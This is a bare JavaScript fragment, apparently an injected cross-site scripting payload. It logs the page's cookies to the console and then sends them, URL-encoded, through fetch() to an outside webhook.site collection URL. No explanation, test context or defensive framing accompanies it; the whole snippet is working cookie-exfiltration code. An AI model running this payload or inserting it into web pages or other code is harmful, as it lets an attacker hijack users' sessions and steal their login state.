console.log("Cookies:", document.cookie);

    fetch(
      "https://webhook.site/6ce42133-da7e-447d-b098-bca2ccb821f7?cookies=" +
        encodeURIComponent(document.cookie),
    );
